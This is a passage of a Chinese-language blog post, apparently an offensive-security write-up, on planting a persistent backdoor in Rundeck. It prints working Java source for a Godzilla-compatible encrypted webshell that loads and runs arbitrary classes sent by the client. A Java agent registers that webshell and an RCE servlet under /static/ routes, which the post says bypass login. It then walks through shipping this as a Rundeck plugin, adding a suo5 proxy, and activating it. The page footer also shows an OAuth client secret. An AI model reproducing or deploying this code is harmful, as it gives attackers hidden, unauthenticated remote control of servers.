+<h4 id="3-添加完整功能-suo5-Godzilla-，确保功能正常"><a href="#3-添加完整功能-suo5-Godzilla-，确保功能正常" class="headerlink" title="3. 添加完整功能(suo5,Godzilla)，确保功能正常"></a>3. 添加完整功能(suo5,Godzilla)，确保功能正常</h4><h5 id="1-添加Godzila注入"><a href="#1-添加Godzila注入" class="headerlink" title="1. 添加Godzila注入"></a>1. 添加Godzila注入</h5><p>Godzila.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GodzillaShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(z);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; Q(<span class="type">byte</span>[] cb) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">PageCtx</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> Object request, response, session;</span><br><span class="line"></span><br><span class="line">        PageCtx(Object req, Object resp, Object sess) &#123;</span><br><span class="line">            <span class="built_in">this</span>.request = req;</span><br><span class="line">            <span class="built_in">this</span>.response = resp;</span><br><span class="line">            <span class="built_in">this</span>.session = sess;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getRequest</span><span class="params">()</span> &#123; <span class="keyword">return</span> request; &#125;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getResponse</span><span class="params">()</span> &#123; <span class="keyword">return</span> response; &#125;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getSession</span><span class="params">()</span> &#123; <span class="keyword">return</span> session; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cipherClass = Class.forName(<span class="string">&quot;javax.crypto.Cipher&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">cipher</span> <span class="operator">=</span> cipherClass.getMethod(<span class="string">&quot;getInstance&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; keyClass = Class.forName(<span class="string">&quot;javax.crypto.spec.SecretKeySpec&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> keyClass.getConstructor(<span class="type">byte</span>[].class, String.class)</span><br><span class="line">                .newInstance(xc.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; keyInterface = Class.forName(<span class="string">&quot;java.security.Key&quot;</span>);</span><br><span class="line">            cipherClass.getMethod(<span class="string">&quot;init&quot;</span>, <span class="type">int</span>.class, keyInterface)</span><br><span class="line">                .invoke(cipher, m ? <span class="number">1</span> : <span class="number">2</span>, key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) cipherClass.getMethod(<span class="string">&quot;doFinal&quot;</span>, <span class="type">byte</span>[].class)</span><br><span class="line">                .invoke(cipher, s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(Object req, Object resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> req.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">lenStr</span> <span class="operator">=</span> (String) getHeader.invoke(req, <span class="string">&quot;Content-Length&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lenStr == <span class="literal">null</span> || lenStr.isEmpty()) &#123;</span><br><span class="line">                resp.getClass().getMethod(<span class="string">&quot;setStatus&quot;</span>, <span class="type">int</span>.class).invoke(resp, <span class="number">200</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>).invoke(resp);</span><br><span class="line">                writer.getClass().getMethod(<span class="string">&quot;print&quot;</span>, String.class).invoke(writer, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> Integer.parseInt(lenStr);</span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len];</span><br><span class="line">            <span class="type">Object</span> <span class="variable">inputStream</span> <span class="operator">=</span> req.getClass().getMethod(<span class="string">&quot;getInputStream&quot;</span>).invoke(req);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">read</span> <span class="operator">=</span> inputStream.getClass().getMethod(<span class="string">&quot;read&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (num &lt; len) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">r</span> <span class="operator">=</span> (Integer) read.invoke(inputStream, data, num, len - num);</span><br><span class="line">                <span class="keyword">if</span> (r == -<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                num += r;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            data = x(data, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">session</span> <span class="operator">=</span> req.getClass().getMethod(<span class="string">&quot;getSession&quot;</span>).invoke(req);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getAttribute</span> <span class="operator">=</span> session.getClass().getMethod(<span class="string">&quot;getAttribute&quot;</span>, String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getAttribute.invoke(session, <span class="string">&quot;payload&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader();</span><br><span class="line">                <span class="type">X</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">X</span>(loader);</span><br><span class="line">                Class&lt;?&gt; payloadClass = classLoader.Q(data);</span><br><span class="line"></span><br><span class="line">                <span class="type">Method</span> <span class="variable">setAttribute</span> <span class="operator">=</span> session.getClass().getMethod(<span class="string">&quot;setAttribute&quot;</span>, String.class, Object.class);</span><br><span class="line">                setAttribute.invoke(session, <span class="string">&quot;payload&quot;</span>, payloadClass);</span><br><span class="line"></span><br><span class="line">                resp.getClass().getMethod(<span class="string">&quot;setStatus&quot;</span>, <span class="type">int</span>.class).invoke(resp, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                req.getClass().getMethod(<span class="string">&quot;setAttribute&quot;</span>, String.class, Object.class)</span><br><span class="line">                    .invoke(req, <span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class&lt;?&gt;) payload).newInstance();</span><br><span class="line"></span><br><span class="line">                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">                <span class="type">Method</span> <span class="variable">equals</span> <span class="operator">=</span> f.getClass().getMethod(<span class="string">&quot;equals&quot;</span>, Object.class);</span><br><span class="line">                equals.invoke(f, out);                                    </span><br><span class="line">                equals.invoke(f, <span class="keyword">new</span> <span class="title class_">PageCtx</span>(req, resp, session));      </span><br><span class="line">                f.toString();                                            </span><br><span class="line"></span><br><span class="line">              </span><br><span class="line">                <span class="type">byte</span>[] result = x(out.toByteArray(), <span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">outputStream</span> <span class="operator">=</span> resp.getClass().getMethod(<span class="string">&quot;getOutputStream&quot;</span>).invoke(resp);</span><br><span class="line">                outputStream.getClass().getMethod(<span class="string">&quot;write&quot;</span>, <span class="type">byte</span>[].class).invoke(outputStream, result);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>HelloAgent.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args,Instrumentation inst)</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;注册路由实现完整功能 &quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">       Thread.sleep(<span class="number">2000</span>);  </span><br><span class="line">        </span><br><span class="line">       <span class="comment">//1. 查找ClassLoader</span></span><br><span class="line">       <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> findWebClassLoader();</span><br><span class="line">       <span class="keyword">if</span> (cl==<span class="literal">null</span>)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;找不到 Classloader&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       System.out.println(<span class="string">&quot;找到Classloader&quot;</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//2.获取 ServletContext</span></span><br><span class="line">       Object servletContext=getServletContext(cl);</span><br><span class="line">       <span class="keyword">if</span> (servletContext==<span class="literal">null</span>)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;找不到servletcontext&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> getServletHandler(servletContext);</span><br><span class="line">       System.out.println(<span class="string">&quot;✓ 获取 ServletHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">&quot;找到servletcontext&quot;</span>);</span><br><span class="line">       registerRCEServlet(servletHandler, cl);</span><br><span class="line">       System.out.println(<span class="string">&quot;http://rundeck:4440/static/exec&quot;</span>);</span><br><span class="line">       registerGodzillaServlet(servletHandler, cl);</span><br><span class="line">       System.out.println(<span class="string">&quot;http://rundeck:4440/static/godzilla&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           System.err.println(<span class="string">&quot;错误&quot;</span>+e.getMessage());</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// ... findWebClassLoader / getServletContext / getServletHandler 方法同上，省略</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerGodzillaServlet</span><span class="params">(Object servletHandler, ClassLoader cl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">       Class&lt;?&gt; servletClass = cl.loadClass(<span class="string">&quot;javax.servlet.Servlet&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建 GodzillaShell 实例</span></span><br><span class="line">       <span class="keyword">final</span> <span class="type">GodzillaShell</span> <span class="variable">godzillaInstance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GodzillaShell</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创建动态代理 Servlet</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">servlet</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">           cl,</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;servletClass&#125;,</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (<span class="string">&quot;service&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">                       <span class="keyword">try</span> &#123;</span><br><span class="line">                           <span class="comment">// ✅ 直接调用，无反射开销</span></span><br><span class="line">                           godzillaInstance.process(args[<span class="number">0</span>], args[<span class="number">1</span>]);</span><br><span class="line">                       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                           e.printStackTrace();</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 使用辅助函数注册 Servlet</span></span><br><span class="line">       regServletMapping(servletHandler, servlet, cl, <span class="string">&quot;GodzillaServlet&quot;</span>, <span class="string">&quot;/static/godzilla&quot;</span>);</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">&quot; Godzilla  注册成功&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... registerRCEServlet 方法同第 2 步，省略</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">regServletMapping</span><span class="params">(Object servletHandler,Object servlet,ClassLoader cl,String servletName,String pathSpec)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">      Class&lt;?&gt; servletClass = cl.loadClass(<span class="string">&quot;javax.servlet.Servlet&quot;</span>);</span><br><span class="line">      Class&lt;?&gt; holderClass = cl.loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletHolder&quot;</span>);</span><br><span class="line"></span><br><span class="line">      Constructor&lt;?&gt; ctor = holderClass.getConstructor(String.class, servletClass);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">holder</span> <span class="operator">=</span> ctor.newInstance(servletName, servlet);</span><br><span class="line">       servletHandler.getClass().getMethod(<span class="string">&quot;addServletWithMapping&quot;</span>,holderClass,String.class).invoke(servletHandler,holder,pathSpec);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-15-41-03.png" class="">
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-15-41-32.png" class="">
+<h5 id="2-添加suo5正向代理"><a href="#2-添加suo5正向代理" class="headerlink" title="2. 添加suo5正向代理"></a>2. 添加suo5正向代理</h5><p>suo5也是常规的套路，使用defineClass字节码动态加载，把suo5.class先base64再调用defineClass加载即可，这里不贴代码，成品在github仓库中。</p>
+<h3 id="编写Rundeck-插件-正式环境注入插件"><a href="#编写Rundeck-插件-正式环境注入插件" class="headerlink" title="编写Rundeck 插件 &amp;&amp; 正式环境注入插件"></a>编写Rundeck 插件 &amp;&amp; 正式环境注入插件</h3><p>根据Rundeck官网的<a target="_blank" rel="noopener" href="https://docs.rundeck.com/3.4.7/developer/01-plugin-development.html#java-plugin-development">开发者文档</a>我们可以知道实现插件的要素</p>
+<table>
+<thead>
+<tr>
+<th>项目类型</th>
+<th>普通 JAR</th>
+<th>Rundeck Plugin JAR</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>入口点</strong></td>
+<td><code>main()</code> 方法</td>
+<td><code>executeStep()</code> 方法</td>
+</tr>
+<tr>
+<td><strong>必需接口</strong></td>
+<td>无</td>
+<td><code>StepPlugin</code> 接口</td>
+</tr>
+<tr>
+<td><strong>必需注解</strong></td>
+<td>无</td>
+<td><code>@Plugin</code> <code>@PluginDescription</code></td>
+</tr>
+<tr>
+<td><strong>MANIFEST.MF</strong></td>
+<td>普通清单</td>
+<td>必需 <code>Rundeck-Plugin-*</code> 条目</td>
+</tr>
+<tr>
+<td><strong>依赖范围</strong></td>
+<td><code>compile</code></td>
+<td><code>provided</code></td>
+</tr>
+<tr>
+<td><strong>生命周期</strong></td>
+<td>JVM 启动执行</td>
+<td>Rundeck 启动加载，作业执行时调用</td>
+</tr>
+<tr>
+<td><strong>ClassLoader</strong></td>
+<td>AppClassLoader</td>
+<td>Rundeck Plugin ClassLoader</td>
+</tr>
+</tbody></table>
+<p>必需的 3 个要素</p>
+<ol>
+<li><strong>实现接口</strong>: <code>implements StepPlugin</code></li>
+<li><strong>添加注解</strong>: <code>@Plugin</code> <code>@PluginDescription</code></li>
+<li><strong>配置 MANIFEST</strong>: <code>Rundeck-Plugin-Classnames</code></li>
+</ol>
+<p>编译好插件之后，上传插件</p>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-15-59-56.png" class="">
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-04-00.png" class="">
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-17-26.png" class="">
+<p>激活插件</p>
+<ol>
+<li>创建一个新的job</li>
+<li>在workflow选择安装好的插件</li>
+<li>激活</li>
+</ol>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-25-44.png" class="">
+
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-19-04.png" class="">
+<p>节点选择 “Excute locally”或者选择Dispatch to Nodes，把rundeck server给包含进来即可激活</p>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-20-08.png" class="">
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-27-01.png" class="">
+<p>验证插件运行正常</p>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-16-38-18.png" class="">
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><p>整个后门植入链路：<strong>Rundeck 插件</strong> → <strong>Java Agent 注入 JVM</strong> → <strong>动态注册 Servlet</strong> → <strong>无需登录访问 WebShell &#x2F; 代理</strong>，在拥有 Rundeck 管理员权限的场景下完整走通，三项功能（RCE WebShell、哥斯拉、suo5 代理）均验证正常。</p>
+<p>需要注意的是，<code>/static/</code> 路由是 Rundeck 的静态资源路径，注入后的 Servlet 挂在该路径下不会触发 SpringSecurity 认证拦截，天然绕过了登录校验。整个过程的关键难点在于理解 Grails + Jetty 的 <code>ServletContext</code> 获取链路，与常规 Tomcat 场景有所不同，需要通过 <code>Holders.getGrailsApplication()</code> 一路向下拿到 <code>ContextHandler</code>。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/01/03/linux-fake-process-name-for-rust/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+		<section id="comments" class="comments">
+			<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="/js/md5.min.js"></script> 
+<div id="gitalk-container"></div>
+<script>
+var gitalkConfig = {"enable":true,"clientID":"Ov23liUDZN1bdqxLLX5N","clientSecret":"a01456e3e89791a65392d68828ab5b14c82548c3","repo":"b1ackow1.github.io","owner":"b1ackow1","admin":["","b1ackow1"],"id":"location.pathname","distractionFreeMode":true,"language":"zh-TW"}
+gitalkConfig.id=md5(location.pathname)
+var gitalk = new Gitalk(gitalkConfig)
+  
+  gitalk.render('gitalk-container')
+
+  </script>
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2026-03-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Programming/">Programming<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+    <ul id="tags" class="tag_box list-unstyled collapse in">
+	    
+  <li><a href="/tags/Rundeck/">Rundeck<span>1</span></a></li> <li><a href="/tags/Java/">Java<span>1</span></a></li> <li><a href="/tags/Backdoor/">Backdoor<span>1</span></a></li>
+    </ul>
+	</div>
+	
+
+    <hr>
+
+	<!-- toc -->
+	
+	<div class="meta-widget">
+	   <div id="toc" class="toc">
+		   <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Begin"><span class="toc-article-text">Begin</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Principle"><span class="toc-article-text">Principle</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Java-agent%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%EF%BC%8C%E7%9C%8B%E6%98%AF%E5%90%A6%E8%83%BD%E5%8A%AB%E6%8C%81%E5%88%B0%E8%B7%AF%E7%94%B1"><span class="toc-article-text">使用Java agent注入测试，看是否能劫持到路由</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8A%AB%E6%8C%81%E5%93%AA%E4%B8%AA%E8%B7%AF%E7%94%B1%EF%BC%9F%E9%9C%80%E8%A6%81%E5%81%9A%E4%BB%80%E4%B9%88%E5%8A%9F%E8%83%BD%EF%BC%9F"><span class="toc-article-text">劫持哪个路由？需要做什么功能？</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%8C%E6%95%B4%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-article-text">完整功能实现</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#1-%E6%B5%8B%E8%AF%95-Java-Agent-%E6%B3%A8%E5%85%A5-JVM"><span class="toc-article-text">1. 测试 Java Agent 注入 JVM</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#2-%E4%BD%BF%E7%94%A8-Java-Agent-%E6%B3%A8%E5%85%A5-WebShell-Servlet"><span class="toc-article-text">2. 使用 Java Agent 注入 WebShell Servlet</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#3-%E6%B7%BB%E5%8A%A0%E5%AE%8C%E6%95%B4%E5%8A%9F%E8%83%BD-suo5-Godzilla-%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%8A%9F%E8%83%BD%E6%AD%A3%E5%B8%B8"><span class="toc-article-text">3. 添加完整功能(suo5,Godzilla)，确保功能正常</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#1-%E6%B7%BB%E5%8A%A0Godzila%E6%B3%A8%E5%85%A5"><span class="toc-article-text">1. 